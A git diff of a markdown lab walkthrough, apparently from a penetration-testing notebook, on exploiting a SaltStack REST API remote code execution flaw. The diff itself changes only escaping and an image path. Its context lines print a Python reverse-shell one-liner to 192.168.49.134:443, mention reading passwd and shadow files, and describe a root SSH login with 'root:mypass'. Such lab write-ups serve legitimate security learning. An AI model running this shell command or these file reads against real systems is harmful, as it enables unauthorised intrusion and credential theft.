@@ -28,7 +28,7 @@ The SaltStack Salt REST API is running.
 
 ## Exploitation
 
-SaltStack < 3000.2, < 2019.2.4, 2017.\*, 2018.\* is vulnerable to an RCE vulnerability.
+SaltStack &lt; 3000.2, &lt; 2019.2.4, 2017.\*, 2018.\* is vulnerable to an RCE vulnerability.
 
 Exploit from: [https://www.exploit-db.com/exploits/48421](https://www.exploit-db.com/exploits/48421)
 
@@ -38,7 +38,7 @@ We can try to execute a reverse shell.
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.134",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 
-However, this does not work (presumably because of the firewall).
+However, this does not work \(presumably because of the firewall\).
 
 We can, however, read arbitrary files, including `passwd` and `shadow`.
 
@@ -71,4 +71,5 @@ Now, using the `root:mypass` credentials, we can SSH into the server as root. Th
 
 ![](../../.gitbook/assets/4994407277db4fe9a3fee4fb462816df.png)
 
-![](<../../.gitbook/assets/7c8646a82aac4f17bf9cba7da5de13b6 (1).png>)
+![](../../.gitbook/assets/7c8646a82aac4f17bf9cba7da5de13b6.png)
+
